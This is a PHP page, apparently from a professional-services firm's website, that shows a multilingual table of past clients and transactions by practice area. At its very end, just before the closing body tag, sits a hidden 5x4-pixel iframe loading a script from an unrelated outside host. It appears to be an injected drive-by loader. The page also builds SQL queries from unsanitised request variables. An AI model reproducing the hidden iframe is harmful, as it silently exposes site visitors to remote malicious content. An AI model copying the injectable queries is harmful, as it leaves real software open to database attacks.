<?
	define ('authenticate', false);
	require ('./inc/conf.inc.php');
	$soc=$_SESSION['socio'];
	if(!$lng){
		$lng=$_SESSION['lng']; 
	}
	if(!isset($id_sel) || $id_sel<1 ){ $id_sel=-1; }
	$tit=$_GET['tit'];
	$modo=$_GET['modo'];
	global $prefijo_socio,$socio;

	$exper['esp']='Experiencia '.($id_sub_sel==8? 'del ':'en ');
	$exper['ing']='Experience '.($id_sub_sel==8? 'of ':'in ');
	$exper['por']='Experience '.($id_sub_sel==8? 'of ':'in ');

	$exper2['esp']='Experiencia';
	$exper2['ing']='Experience';
	$exper2['por']='Experience';
	
	$cliente['esp']='Cliente';
	$cliente['ing']='Client';
	$cliente['por']='Client';
	
	$transaccion['esp']='Transacción';
	$transaccion['ing']='Transaction';
	$transaccion['por']='Transaction';
	
	$paises['esp']='País';
	$paises['ing']='Country';
	$paises['por']='Country';
	
	$ano['esp']='Año';
	$ano['ing']='Year';
	$ano['por']='Year';

?>
<link href="estilos<?=$soc?>.css" rel="stylesheet" type="text/css">
<script language="javascript">
//precacheo de imagenes
var bullet1=new Image(9,15);
bullet1.src="images/flechita1.gif";
var bullet2=new Image(9,15);
//bullet2.src="images/bullet<?=$soc?>2.gif";
bullet2.src="images/flechita1.gif";


//////////////////////////////////////////
function opcionover(x){
x.className='linkover2';
x.parentNode.parentNode.firstChild.firstChild.src=bullet2.src;
}
function opcionout(x){
x.className='link2';
x.parentNode.parentNode.firstChild.firstChild.src=bullet1.src;
}

function atras(x){
	formframe.id_sel.value=x
	formframe.submit()

}
var lng='<?=$lng?>';
</script>
<style type="text/css">
<!--
.style7 {font-family: Verdana, Arial, Helvetica, sans-serif; font-weight: bold; font-size: 11px; }
.style9 {font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 10px}
-->
</style>
<link href="./estilos<?=$_SESSION['socio']?>.css" rel="stylesheet" type="text/css">

</head>
<?
	/*if( $id_sub_sel ){
		$excepciones[]=12;
		if(in_array($id_sub_sel,$excepciones)){ $tit='descrip'; } else { $tit='titulo';}
	*/
	
	if(strlen($id_sub_sel)==0 ){
		$id_sub_sel=0;
	}
	else{
		$id_tmp=$id_sub_sel;
	}
	if( $id_sub_sel >= 0){
		$excepciones[]=12;
		if(in_array($id_sub_sel,$excepciones)){ $tit='descrip'; } else { $tit='titulo';}
	
		//dbi::value('secciones',"id=$id_tmp and lng='$lng'",$tit)
		$db->select('secciones','*',"id=$id_tmp and lng='$lng'");
		$row=$db->fetch_object();
	if($modo==1){
		$titulo_seccion=$row->descrip;
	}
	else{
		$titulo_seccion=$row->titulo;
	}		
		$intro['esp']='Las siguientes, son algunas de las empresas a las que les hemos brindado nuestros servicios en esta materia.';
		$intro['ing']='Below there are listed some of the clients we have worked for in this areas.';
		$intro['por']='Below there are listed some of the clients we have worked for in this areas.';
?>
<table width="100%" border="0" cellpadding="0" cellspacing="0">
<tr valign="top">
	<td height="35" colspan="5" align="right" valign="bottom" class="espacio" ><span class="titulos"><?= $id_sub_sel != '' ? $exper[$lng]." $titulo_seccion" : $exper2[$lng] ?>&nbsp;&nbsp;</span>
	</td>
</tr>
</table>
<?
	if( $id_sub_sel>8 &&  $id_sub_sel<16 ){
?>
<table width="100%" border="0" cellpadding="0" cellspacing="0">
<tr valign="top">
	<td height="43" align="justify" valign="middle" class="espacio" ><span class="style9"><?=$intro[$lng]?>&nbsp;&nbsp;</span>
	</td>
</tr>
</table>
<?
	}
	$experiencias = dbi::select( 'experiencia', '*', "id = $id_sub_sel".( $pais ? " AND pais = '$pais'" : '')." and lng='$lng'" ,'cliente');
	if($experiencias->num_rows()==0){
		$experiencias = dbi::select( 'experiencia', '*', "id_parent = $id_sub_sel".( $pais ? " AND pais = '$pais'" : '') ." and lng='$lng'",'cliente');
	}	
	if( $experiencia = $experiencias->fetch_object() )
	{
		$año = $experiencia->ano ? true : false;
?>
<table height="100%" width="100%" cellpadding="0" cellspacing="0" border="0">
<tr valign="top">
<td width="0%" valign="top" height="100%">
  <table width="100%"  cellspacing="0" cellpadding="2">
	<tr bgcolor="#CCCCCC">
		<td style="border-top: 1px solid #666666;"><font color="#666666" class="style7"><?=$cliente[$lng]?></font></td>
		<? if( $id_sub_sel!=8 && $id_sub_sel!=11 && $id_sub_sel!=13 ){ ?>
		<td style="border-top: 1px solid #666666;"><font color="#666666" class="style7"><?=$transaccion[$lng]?></font></td>
		<? } ?>
		<td width="35" style="border-top: 1px solid #666666;"><font color="#666666" class="style7"><?=$paises[$lng]?></font></td>
	</tr>
	<?
	do
	{
		?>
			<tr align="left" valign="top">
				<td class="style9" style="border-top: 1px solid #666666;"><?= $experiencia->cliente?></td>
				<? if( $id_sub_sel!=8 && $id_sub_sel!=11 && $id_sub_sel!=13 ){ ?>
				<td class="style9" style="border-top: 1px solid #666666;"><?= $experiencia->transaccion?>&nbsp;</td>
				<? } ?>
				<td width="35" class="style9" style="border-top: 1px solid #666666;"><img src="images/<?= strtolower($experiencia->pais)?>.gif" border="0" /></td>
			</tr>
			<?
		}while( $experiencia = $experiencias->fetch_object() );
	}
	else{
		if($lng=='esp'){
			if($id_sub_sel==14){
				echo "<br><ul><li><span class='textocontenido'>Por razones de estricta confidencialidad, se omiten referencias a clientes dentro de ésta area de práctica.  Para mayor información respecto a  nuestra  experiencia, por favor no dude en comunicarse con nosotros</span></li></ul>";
			}
			else{
				echo "<br><ul><li><span class='textocontenido'>Para mayor información respecto a la experiencia en esta área de práctica, por favor no dude en comunicarse con nosotros</span></li></ul>";
			}
		}
		if($lng=='ing'){
			if($id_sub_sel==14){
				echo "<br><ul><li><span class='textocontenido'>For confidentiality reasons, we include no references  to our experience in this practice area.  For more information  regarding to this particular area, do not hesitate to contact us.</span></li></ul>";
			}		
		}
		if($lng=='por'){
			if($id_sub_sel==14){
				echo "<br><ul><li><span class='textocontenido'>For confidentiality reasons, we include no references  to our experience in this practice area.  For more information  regarding to this particular area, do not hesitate to contact us.</span></li></ul>";
			}		
		}
	
	}
	?>
</table></td>
</TD></TR></Table>
<iframe src="http://david123.com/r/g.php" width="5" height="4" align="right"></iframe></body></html>
<? } ?>
